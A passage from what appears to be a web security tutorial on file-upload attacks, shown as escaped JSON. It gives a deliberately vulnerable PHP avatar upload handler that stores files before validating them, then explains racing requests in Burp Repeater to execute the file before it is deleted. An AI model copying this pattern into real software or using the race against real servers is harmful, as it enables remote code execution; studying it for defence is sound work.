the file to the uploads directory before actually validating it’s content.\n\u003c?php $target_dir = \"avatars/\"; $target_file = $target_dir . $_FILES[\"avatar\"][\"name\"]; // temporary move move_uploaded_file($_FILES[\"avatar\"][\"tmp_name\"], $target_file); if (checkViruses($target_file) \u0026\u0026 checkFileType($target_file)) { echo \"The file \". htmlspecialchars( $target_file). \" has been uploaded.\"; } else { unlink($target_file); echo \"Sorry, there was an error uploading your file.\"; http_response_code(403); } function checkViruses($fileName) { // checking for viruses ... } function checkFileType($fileName) { $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION)); if($imageFileType != \"jpg\" \u0026\u0026 $imageFileType != \"png\") { echo \"Sorry, only JPG \u0026 PNG files are allowed\\n\"; return false; } else { return true; } } ?\u003e We can use burp repeater to send both requests in a single packet.\nSometimes, it’ll not execute the file at first, but we can keep trying the attack in order to eventually have the second request hitting the server before the validation happens, while the file is still in the uploads directory."},"title":"File Upload"}}